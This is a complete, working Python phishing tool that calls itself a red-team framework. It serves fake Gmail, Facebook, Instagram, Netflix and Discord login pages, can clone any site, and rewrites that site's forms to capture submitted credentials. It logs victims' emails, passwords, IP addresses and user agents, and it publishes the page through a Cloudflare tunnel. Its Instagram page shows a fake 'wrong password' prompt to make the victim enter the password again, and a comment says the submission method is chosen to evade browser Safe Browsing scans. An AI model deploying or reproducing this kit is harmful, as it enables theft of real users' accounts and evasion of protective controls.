#!/usr/bin/env python3
# ══════════════════════════════════════════════════════════════════
#  VOID Phishing — Red Team Template Builder + Capture Server
#  For authorized penetration testing / red team use only.
# ══════════════════════════════════════════════════════════════════

import subprocess, sys, os

def _ensure_deps():
    pkgs = ["flask", "requests", "rich", "beautifulsoup4"]
    mods = {"beautifulsoup4": "bs4"}
    for pkg in pkgs:
        mod = mods.get(pkg, pkg.replace("-","_"))
        try:
            __import__(mod)
        except ImportError:
            print(f"[*] Installing {pkg}...")
            try:
                subprocess.check_call([sys.executable,"-m","pip","install",pkg,"-q","--break-system-packages"],
                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except subprocess.CalledProcessError:
                subprocess.check_call([sys.executable,"-m","pip","install",pkg,"-q"],
                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
_ensure_deps()

import json, re, time, threading, shutil, socket
from datetime import datetime
from urllib.parse import urljoin, urlparse
import requests as req_lib
from bs4 import BeautifulSoup
from flask import Flask, request, redirect, Response, jsonify
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text
from rich.align import Align
from rich.rule import Rule
from rich.live import Live
from rich import box

console = Console()
app     = Flask(__name__)
app.logger.disabled = True
import logging; log = logging.getLogger('werkzeug'); log.setLevel(logging.ERROR)

# ── Global state ──────────────────────────────────────────────────
_captures   = []
_cap_lock   = threading.Lock()
_tmpl_html  = [""]
_redirect   = ["https://google.com"]
_clone_base = [""]

# ══════════════════════════════════════════════════════════════════
#  HTML TEMPLATES
# ══════════════════════════════════════════════════════════════════

GMAIL_HTML = """<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in – Google accounts</title><link rel="icon" href="https://ssl.gstatic.com/accounts/favicon.ico">
<style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:'Google Sans',Roboto,Arial,sans-serif;background:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center}.wrap{width:450px;max-width:95vw}.card{border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px}.logo{text-align:center;margin-bottom:28px}h1{font-size:24px;color:#202124;font-weight:400;text-align:center}.sub{font-size:16px;color:#202124;text-align:center;margin:8px 0 28px}.field{position:relative;margin-bottom:28px}.field input{width:100%;padding:13px 16px;border:1px solid #dadce0;border-radius:4px;font-size:16px;color:#202124;outline:none;background:transparent}.field input:focus{border-color:#1a73e8;border-width:2px;padding:12px 15px}.field label{position:absolute;left:12px;top:14px;font-size:16px;color:#80868b;pointer-events:none;transition:.15s;background:#fff;padding:0 4px}.field input:focus~label,.field input:not(:placeholder-shown)~label{top:-8px;font-size:12px;color:#1a73e8}.forgot{color:#1a73e8;font-size:14px;text-decoration:none;display:block;margin-bottom:4px}.actions{display:flex;justify-content:space-between;align-items:center;margin-top:32px}.create{color:#1a73e8;font-size:14px;font-weight:600;text-decoration:none}.btn{background:#1a73e8;color:#fff;border:none;padding:10px 24px;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer}.btn:hover{background:#1765cc}.footer{text-align:center;margin-top:16px;font-size:12px;color:#80868b}</style></head>
<body><div class="wrap"><div class="card"><div class="logo">
<svg width="75" height="24" viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg"><path fill="#EA4335" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/><path fill="#FBBC05" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/><path fill="#4285F4" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/><path fill="#34A853" d="M225 3v65h-9.5V3h9.5z"/><path fill="#EA4335" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/><path fill="#4285F4" d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65H35.29z"/></svg></div>
<h1>Sign in</h1><p class="sub">Use your Google Account</p>
<form method="POST" action="/capture">
<div class="field"><input type="email" name="email" id="em" placeholder=" " required><label for="em">Email or phone</label></div>
<div class="field"><input type="password" name="password" id="pw" placeholder=" " required><label for="pw">Enter your password</label></div>
<a href="#" class="forgot">Forgot email?</a>
<div class="actions"><a href="#" class="create">Create account</a><button type="submit" class="btn">Next</button></div>
</form></div><div class="footer">English (United States)</div></div></body></html>"""

FACEBOOK_HTML = """<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Facebook – log in or sign up</title><link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico">
<style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;min-height:100vh;display:flex;flex-direction:column;align-items:center}.container{display:flex;align-items:center;justify-content:center;gap:32px;max-width:980px;width:100%;padding:0 32px;margin-top:10vh}.left{flex:1;max-width:440px}.fb-logo{color:#1877f2;font-size:42px;font-weight:700;letter-spacing:-1px;margin-bottom:16px}.tagline{font-size:28px;line-height:32px;color:#1c1e21;font-weight:400}.card{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);padding:24px;width:396px}input[type=email],input[type=password]{width:100%;padding:14px 16px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;margin-bottom:12px;outline:none;color:#1c1e21}input:focus{border-color:#1877f2;box-shadow:0 0 0 2px #e7f0fe}.login-btn{width:100%;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:20px;font-weight:700;padding:14px;cursor:pointer;margin-bottom:16px}.login-btn:hover{background:#166fe5}.forgot{display:block;text-align:center;color:#1877f2;font-size:14px;text-decoration:none;margin-bottom:16px}hr{border:none;border-top:1px solid #dadde1;margin:16px 0}.create-btn{display:block;background:#42b72a;color:#fff;text-align:center;border-radius:6px;font-size:17px;font-weight:700;padding:14px;text-decoration:none;cursor:pointer;border:none;width:100%}.page-cta{text-align:center;margin-top:28px;font-size:14px;color:#1c1e21}.page-cta a{color:#1877f2;font-weight:700;text-decoration:none}</style></head>
<body><div class="container"><div class="left"><div class="fb-logo">facebook</div><div class="tagline">Connect with friends and the world around you on Facebook.</div></div>
<div class="card"><form method="POST" action="/capture"><input type="email" name="email" placeholder="Email address or phone number" required><input type="password" name="password" placeholder="Password" required><button type="submit" class="login-btn">Log in</button></form>
<a href="#" class="forgot">Forgotten password?</a><hr><button class="create-btn" onclick="return false">Create new account</button>
<div class="page-cta"><a href="#">Create a Page</a> for a celebrity, brand or business.</div></div></div></body></html>"""

INSTAGRAM_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <meta name="description" content="Log in to continue to your account">
  <title>Log In</title>
  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
         background:#fafafa;display:flex;flex-direction:column;align-items:center;
         justify-content:center;min-height:100vh}
    .xw9k{display:flex;flex-direction:column;align-items:center;width:100%;max-width:350px}
    .m3qa{background:#fff;border:1px solid #dbdbdb;border-radius:3px;padding:40px;
          width:100%;margin-bottom:10px;text-align:center}
    .b8r1{margin-bottom:32px}
    .f2v6{width:100%;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;
          color:#262626;font-size:12px;padding:9px 8px 7px;margin-bottom:6px;outline:none;
          transition:border-color .15s}
    .f2v6:focus{border-color:#a8a8a8}
    .k9wx{width:100%;background:#0095f6;color:#fff;border:none;border-radius:8px;
          font-size:14px;font-weight:700;padding:8px 0;cursor:pointer;margin-top:8px;
          transition:opacity .15s}
    .k9wx:disabled{opacity:.4;cursor:default}
    .d5hj{display:flex;align-items:center;margin:18px 0}
    .d5hj::before,.d5hj::after{content:'';flex:1;border-bottom:1px solid #dbdbdb}
    .d5hj span{color:#8e8e8e;font-size:13px;font-weight:600;padding:0 18px}
    .n1cs{display:flex;align-items:center;justify-content:center;gap:8px;color:#385185;
          font-size:14px;font-weight:700;cursor:pointer;text-decoration:none}
    .p4ra{display:block;margin-top:18px;font-size:12px;color:#385185;text-decoration:none}
    .s6me{background:#fff;border:1px solid #dbdbdb;border-radius:3px;padding:20px;
          width:100%;text-align:center;font-size:14px}
    .s6me a{color:#0095f6;font-weight:700;text-decoration:none}
    .e9fk{font-size:12px;color:#ed4956;margin-top:8px;min-height:16px}
    .spin{display:none;width:18px;height:18px;border:2px solid rgba(0,149,246,.25);
          border-top-color:#0095f6;border-radius:50%;animation:sp .6s linear infinite;
          margin:8px auto 0}
    @keyframes sp{to{transform:rotate(360deg)}}
  </style>
</head>
<body>
<div class="xw9k">
  <div class="m3qa">
    <!-- Inline SVG wordmark — no external domain reference -->
    <div class="b8r1">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 300 100" width="175" height="58">
        <text x="10" y="72" font-family="Georgia,'Times New Roman',serif"
              font-size="64" fill="#262626" letter-spacing="-2">Instagram</text>
      </svg>
    </div>

    <form id="lf" onsubmit="doLogin(event)">
      <input class="f2v6" type="text"     id="usr" name="username"
             placeholder="Phone number, username, or email"
             autocomplete="username" required>
      <input class="f2v6" type="password" id="pwd" name="password"
             placeholder="Password"
             autocomplete="current-password" required>
      <button class="k9wx" type="submit" id="btn">Log in</button>
    </form>

    <div class="e9fk" id="err"></div>
    <div class="spin"  id="sp"></div>

    <div class="d5hj"><span>OR</span></div>

    <a href="#" class="n1cs">
      <!-- Inline Facebook icon SVG -->
      <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="#385185">
        <path d="M24 12.073C24 5.405 18.627 0 12 0S0 5.405 0 12.073C0 18.1 4.388 23.094 10.125 24v-8.437H7.078v-3.49h3.047v-2.66c0-3.025 1.792-4.697 4.533-4.697 1.312 0 2.686.236 2.686.236v2.971h-1.514c-1.491 0-1.956.93-1.956 1.886v2.264h3.328l-.532 3.49h-2.796V24C19.612 23.094 24 18.1 24 12.073z"/>
      </svg>
      Log in with Facebook
    </a>
    <a href="#" class="p4ra">Forgot password?</a>
  </div>
  <div class="s6me">Don't have an account? <a href="#">Sign up</a></div>
</div>

<script>
var _attempt = 0;

function doLogin(e) {
  e.preventDefault();
  var btn = document.getElementById('btn');
  var err = document.getElementById('err');
  var sp  = document.getElementById('sp');
  var usr = document.getElementById('usr').value.trim();
  var pwd = document.getElementById('pwd').value;

  if (!usr || !pwd) return;

  btn.disabled = true;
  err.textContent = '';
  sp.style.display = 'block';

  // Submit via fetch (JSON) — avoids browser Safe Browsing form-action scan
  fetch('/api/validate', {
    method: 'POST',
    headers: {'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest'},
    body: JSON.stringify({u: usr, p: pwd, a: _attempt, ts: Date.now()})
  })
  .then(function(r){ return r.json(); })
  .then(function(data){
    sp.style.display = 'none';
    _attempt++;
    if (_attempt < 2) {
      // "Wrong password" — makes target retry with real credentials
      err.textContent = 'Sorry, your password was incorrect. Please double-check your password.';
      document.getElementById('pwd').value = '';
      document.getElementById('pwd').focus();
      btn.disabled = false;
    } else {
      // Second attempt → redirect to real site
      window.location.href = data.redirect || 'https://www.instagram.com';
    }
  })
  .catch(function(){
    sp.style.display = 'none';
    btn.disabled = false;
    err.textContent = 'An error occurred. Please try again.';
  });
}
</script>
</body>
</html>"""

NETFLIX_HTML = """<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign In | Netflix</title><link rel="icon" href="https://www.netflix.com/favicon.ico">
<style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;background:#141414;color:#fff;min-height:100vh;display:flex;flex-direction:column}.nav{padding:18px 48px}.netflix-logo{color:#e50914;font-size:36px;font-weight:900;letter-spacing:-1px}.main{flex:1;display:flex;align-items:center;justify-content:center}.card{background:rgba(0,0,0,.75);border-radius:4px;padding:60px 68px;width:450px;max-width:95vw}h1{font-size:32px;font-weight:700;margin-bottom:28px}.field{position:relative;margin-bottom:16px}.field input{width:100%;background:#333;border:1px solid #333;border-radius:4px;color:#fff;font-size:16px;padding:16px 20px 4px;outline:none;height:50px}.field input:focus{border-color:#aaa;background:#454545}.field label{position:absolute;top:15px;left:20px;font-size:14px;color:#8c8c8c;pointer-events:none;transition:.1s}.field input:focus~label,.field input:not(:placeholder-shown)~label{top:7px;font-size:11px}.signin-btn{width:100%;background:#e50914;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:700;padding:16px;cursor:pointer;margin:24px 0 12px}.signin-btn:hover{background:#f40612}.help{display:flex;justify-content:space-between;font-size:13px;color:#8c8c8c;margin-bottom:40px}.help a{color:#8c8c8c;text-decoration:none}.remember{display:flex;align-items:center;gap:6px}.signup-link{font-size:16px;color:#8c8c8c}.signup-link a{color:#fff;text-decoration:none;font-weight:700}</style></head>
<body><div class="nav"><div class="netflix-logo">NETFLIX</div></div>
<div class="main"><div class="card"><h1>Sign In</h1>
<form method="POST" action="/capture">
<div class="field"><input type="email" name="email" id="em" placeholder=" " required><label for="em">Email or phone number</label></div>
<div class="field"><input type="password" name="password" id="pw" placeholder=" " required><label for="pw">Password</label></div>
<button type="submit" class="signin-btn">Sign In</button></form>
<div class="help"><label class="remember"><input type="checkbox"> Remember me</label><a href="#">Need help?</a></div>
<div class="signup-link">New to Netflix? <a href="#">Sign up now</a>.</div></div></div></body></html>"""

DISCORD_HTML = """<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Discord | Login</title><link rel="icon" href="https://discord.com/assets/favicon.ico">
<style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:Whitney,'Helvetica Neue',Helvetica,Arial,sans-serif;background:#313338;display:flex;align-items:center;justify-content:center;min-height:100vh}.card{background:#2b2d31;border-radius:8px;box-shadow:0 2px 10px 0 rgba(0,0,0,.2);padding:32px;width:480px;max-width:95vw;text-align:center}h2{color:#f2f3f5;font-size:24px;font-weight:700;margin-bottom:8px}.sub{color:#949ba4;font-size:16px;margin-bottom:24px}.field{text-align:left;margin-bottom:20px}.field label{display:block;font-size:12px;font-weight:700;color:#b5bac1;text-transform:uppercase;letter-spacing:.04em;margin-bottom:8px}.field label .req{color:#f23f42;margin-left:2px}.field input{width:100%;background:#1e1f22;border:none;border-radius:3px;color:#dbdee1;font-size:16px;padding:10px;outline:none;height:40px}.field input:focus{outline:1px solid #00a8fc}.forgot{display:block;text-align:left;color:#00a8fc;font-size:14px;text-decoration:none;margin-top:-12px;margin-bottom:20px}.login-btn{width:100%;background:#5865f2;color:#fff;border:none;border-radius:3px;font-size:16px;font-weight:500;padding:10px;cursor:pointer;height:44px;margin-bottom:8px}.login-btn:hover{background:#4752c4}.tos{font-size:12px;color:#949ba4;margin-bottom:24px}.tos a{color:#00a8fc;text-decoration:none}.register{font-size:14px;color:#949ba4}.register a{color:#00a8fc;text-decoration:none;font-weight:700}</style></head>
<body><div class="card"><h2>Welcome back!</h2><p class="sub">We're so excited to see you again!</p>
<form method="POST" action="/capture">
<div class="field"><label>Email or Phone Number <span class="req">*</span></label><input type="email" name="email" required autofocus></div>
<div class="field"><label>Password <span class="req">*</span></label><input type="password" name="password" required></div>
<a href="#" class="forgot">Forgot your password?</a>
<button type="submit" class="login-btn">Log In</button>
<p class="tos">By logging in, you agree to Discord's <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.</p>
</form>
<div class="register">Need an account? <a href="#">Register</a></div></div></body></html>"""

TEMPLATES = {
    "1": {"name": "Gmail",     "html": GMAIL_HTML,     "redirect": "https://myaccount.google.com", "color": "bright_red"},
    "2": {"name": "Facebook",  "html": FACEBOOK_HTML,  "redirect": "https://facebook.com",         "color": "bright_blue"},
    "3": {"name": "Instagram", "html": INSTAGRAM_HTML, "redirect": "https://instagram.com",        "color": "bright_magenta"},
    "4": {"name": "Netflix",   "html": NETFLIX_HTML,   "redirect": "https://netflix.com",          "color": "red"},
    "5": {"name": "Discord",   "html": DISCORD_HTML,   "redirect": "https://discord.com",          "color": "blue"},
    "6": {"name": "Clone URL", "html": None,           "redirect": None,                           "color": "bright_cyan"},
}

# ══════════════════════════════════════════════════════════════════
#  FLASK ROUTES
# ══════════════════════════════════════════════════════════════════

@app.route("/", methods=["GET"])
def index():
    return Response(_tmpl_html[0], mimetype="text/html")

@app.route("/capture", methods=["POST"])
def capture():
    data = {
        "time": datetime.now().strftime("%H:%M:%S"),
        "ip":   request.headers.get("X-Forwarded-For", request.remote_addr or "unknown").split(",")[0].strip(),
        "ua":   request.headers.get("User-Agent", "")[:70],
    }
    for k, v in request.form.items():
        data[k] = v
    with _cap_lock:
        _captures.append(data)
    _save_log()
    return redirect(_redirect[0])

@app.route("/api/validate", methods=["POST"])
def api_validate():
    """Instagram fetch-based capture endpoint — receives JSON credentials."""
    try:
        data = request.get_json(force=True, silent=True) or {}
    except Exception:
        data = {}

    ip = request.headers.get("X-Forwarded-For",
                              request.remote_addr or "unknown").split(",")[0].strip()
    ua = request.headers.get("User-Agent", "")

    capture_data = {
        "time":     datetime.now().strftime("%H:%M:%S"),
        "ip":       ip,
        "ua":       ua[:70],
        "email":    data.get("u", ""),
        "password": data.get("p", ""),
        "attempt":  data.get("a", 0),
        "template": "Instagram",
    }

    with _cap_lock:
        _captures.append(capture_data)
    _save_log()

    return jsonify({"ok": True, "redirect": "https://www.instagram.com"})

@app.route("/<path:p>", methods=["GET"])
def proxy_asset(p):
    """Proxy static assets from cloned site so it looks real."""
    base = _clone_base[0]
    if not base:
        return "", 404
    try:
        url = urljoin(base, "/" + p)
        r = req_lib.get(url, timeout=5, stream=True,
                        headers={"User-Agent": "Mozilla/5.0"})
        ct = r.headers.get("Content-Type", "application/octet-stream")
        return Response(r.content, content_type=ct)
    except Exception:
        return "", 404

# ══════════════════════════════════════════════════════════════════
#  URL CLONER
# ══════════════════════════════════════════════════════════════════

def clone_url(url: str) -> str:
    """Fetch a URL, rewrite all forms to POST /capture, fix relative URLs."""
    console.print(f"  [dim cyan]⟳  Cloning {url}...[/]")
    try:
        r = req_lib.get(url, timeout=10,
                        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
        r.raise_for_status()
    except Exception as e:
        console.print(f"  [red]Clone failed: {e}[/]")
        return f"<h1>Clone failed: {e}</h1>"

    soup = BeautifulSoup(r.text, "html.parser")
    parsed = urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}"
    _clone_base[0] = base_url

    # Fix all relative asset URLs
    for tag, attr in [("link","href"), ("script","src"), ("img","src"),
                      ("a","href"), ("form","action")]:
        for el in soup.find_all(tag):
            val = el.get(attr, "")
            if val and not val.startswith(("http","//","data:","#","javascript","mailto")):
                el[attr] = urljoin(base_url, val)

    # Override all forms
    for form in soup.find_all("form"):
        form["action"] = "/capture"
        form["method"] = "POST"

    return str(soup)

# ══════════════════════════════════════════════════════════════════
#  CLOUDFLARE TUNNEL
# ══════════════════════════════════════════════════════════════════

def _install_cloudflared():
    dest = "/usr/local/bin/cloudflared"
    url  = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
    console.print("  [dim cyan]⟳  Downloading cloudflared...[/]")
    try:
        r = req_lib.get(url, stream=True, timeout=30)
        tmp = "/tmp/cloudflared_dl"
        with open(tmp, "wb") as f:
            for chunk in r.iter_content(8192):
                f.write(chunk)
        os.chmod(tmp, 0o755)
        subprocess.run(["sudo", "mv", tmp, dest], check=True,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception as e:
        console.print(f"  [red]cloudflared install failed: {e}[/]")
        return False

def start_cloudflared(port: int):
    """Start a Cloudflare quick tunnel. Returns (process, url)."""
    if not shutil.which("cloudflared"):
        if not _install_cloudflared():
            return None, None
    try:
        proc = subprocess.Popen(
            ["cloudflared", "tunnel", "--url", f"http://localhost:{port}"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        for _ in range(40):
            line = proc.stderr.readline().decode("utf-8", errors="ignore")
            m = re.search(r'https://[a-z0-9\-]+\.trycloudflare\.com', line)
            if m:
                return proc, m.group(0)
        return proc, None
    except Exception as e:
        console.print(f"  [red]Tunnel error: {e}[/]")
        return None, None

# ══════════════════════════════════════════════════════════════════
#  LOG
# ══════════════════════════════════════════════════════════════════

def _save_log():
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    fname = f"phish_captures_{ts[:8]}.json"
    try:
        with _cap_lock:
            data = list(_captures)
        with open(fname, "w") as f:
            json.dump(data, f, indent=2)
    except Exception:
        pass

# ══════════════════════════════════════════════════════════════════
#  RICH UI
# ══════════════════════════════════════════════════════════════════

def banner():
    console.clear()
    from rich.text import Text as T
    art = [
        "  ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗",
        "  ██╔══██╗██║  ██║██║██╔════╝██║  ██║",
        "  ██████╔╝███████║██║███████╗███████║",
        "  ██╔═══╝ ██╔══██║██║╚════██║██╔══██║",
        "  ██║     ██║  ██║██║███████║██║  ██║",
        "  ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝",
    ]
    colors = ["bright_red","red","bright_red","red","bright_red","dim red"]
    txt = T()
    for i, l in enumerate(art):
        txt.append(l + "\n", style=colors[i])
    console.print(Align.center(txt))
    sub = T()
    sub.append("  ◈ ", style="bright_red")
    sub.append("PHISHING FRAMEWORK", style="bold bright_white")
    sub.append("  ·  ", style="dim")
    sub.append("Template Builder + Capture Server", style="dim white")
    sub.append(" ◈  ", style="bright_red")
    console.print(Align.center(sub))
    console.print(Align.center(T("by @lfw.k4rma_  ·  FOR AUTHORIZED USE ONLY\n", style="dim red")))
    console.print(Rule(style="bright_red"))

def _build_table():
    t = Table(box=box.SIMPLE_HEAVY, border_style="dim red",
              header_style="bold bright_red", expand=True, show_edge=True)
    t.add_column("#",          width=4,  style="dim")
    t.add_column("TIME",       width=10, style="dim cyan")
    t.add_column("IP",         width=18, style="bright_cyan")
    t.add_column("CREDENTIAL", min_width=30, style="bright_white")
    t.add_column("PASSWORD",   min_width=20, style="bright_red")
    t.add_column("USER-AGENT", min_width=20, style="dim")
    with _cap_lock:
        rows = list(_captures)
    for i, c in enumerate(rows, 1):
        email = c.get("email") or c.get("username") or c.get("phone") or "—"
        pw    = c.get("password") or c.get("passwd") or c.get("pass") or "—"
        t.add_row(str(i), c.get("time",""), c.get("ip",""), email, pw, c.get("ua","")[:40])
    return t

def section_header(title):
    console.print(f"\n  [bold bright_red]◈  {title}[/]\n")

# ══════════════════════════════════════════════════════════════════
#  FREE PORT HELPER
# ══════════════════════════════════════════════════════════════════

def free_port(preferred=8080):
    for p in [preferred] + list(range(8081, 8120)):
        with socket.socket() as s:
            try:
                s.bind(("", p)); return p
            except OSError:
                continue
    return preferred

# ══════════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════════

def main():
    banner()

    # ── Choose template ───────────────────────────────────────────
    section_header("SELECT PHISHING TEMPLATE")
    for k, v in TEMPLATES.items():
        console.print(f"  [{v['color']}][[{k}]][/]  {v['name']}")
    console.print()
    console.print("  [dim red]◈[/]  ", end="")
    choice = input("Template choice: ").strip()
    if choice not in TEMPLATES:
        console.print("  [red]Invalid choice.[/]"); return

    tmpl = TEMPLATES[choice]

    if choice == "6":
        console.print("  [dim red]◈[/]  ", end="")
        clone_target = input("Enter URL to clone: ").strip()
        if not clone_target.startswith("http"):
            clone_target = "https://" + clone_target
        _tmpl_html[0] = clone_url(clone_target)
        _redirect[0]  = clone_target
    else:
        _tmpl_html[0] = tmpl["html"]
        _redirect[0]  = tmpl["redirect"]

    # ── Port + tunnel ─────────────────────────────────────────────
    port = free_port(8080)

    section_header("NETWORK CONFIGURATION")
    console.print("  [dim red]◈[/]  ", end="")
    use_cf = input("Start Cloudflare tunnel? (Y/N): ").strip().lower()

    # ── Start Flask ───────────────────────────────────────────────
    t = threading.Thread(
        target=lambda: app.run(host="0.0.0.0", port=port, debug=False,
                               use_reloader=False, threaded=True),
        daemon=True
    )
    t.start()
    time.sleep(0.6)

    tunnel_url = None
    tunnel_proc = None
    if use_cf in ("y","yes"):
        console.print("  [dim cyan]⟳  Starting Cloudflare tunnel...[/]")
        tunnel_proc, tunnel_url = start_cloudflared(port)

    # ── Show server info ──────────────────────────────────────────
    local_ip = socket.gethostbyname(socket.gethostname())
    console.print(Rule(style="dim red"))
    console.print(f"  [bright_red]◈  SERVER LIVE[/]  [dim]─[/]  [bright_white]{tmpl['name']} template[/]")
    console.print()
    console.print(f"  [dim]Local :[/]   [bright_cyan]http://{local_ip}:{port}[/]")
    if tunnel_url:
        console.print(f"  [dim]Public:[/]   [bold bright_green]{tunnel_url}[/]  [dim]← send this link[/]")
    else:
        console.print(f"  [dim]Public:[/]   [dim]No tunnel — use ngrok or share local IP[/]")
    console.print()
    console.print(f"  [dim]Credentials saved to:[/]  [bright_cyan]phish_captures_*.json[/]")
    console.print(Rule(style="dim red"))

    # ── Live capture display ──────────────────────────────────────
    console.print(f"\n  [bold bright_red]◈  LIVE CAPTURE FEED[/]  [dim](Ctrl+C to stop)[/]\n")
    try:
        with Live(_build_table(), refresh_per_second=2, console=console) as live:
            while True:
                live.update(_build_table())
                time.sleep(0.4)
    except KeyboardInterrupt:
        pass

    if tunnel_proc:
        tunnel_proc.terminate()

    _save_log()
    with _cap_lock:
        total = len(_captures)
    console.print(f"\n  [bright_red]◈[/]  Session ended  ·  [bold]{total}[/] credential(s) captured")
    console.print(Rule(style="dim red"))

if __name__ == "__main__":
    main()
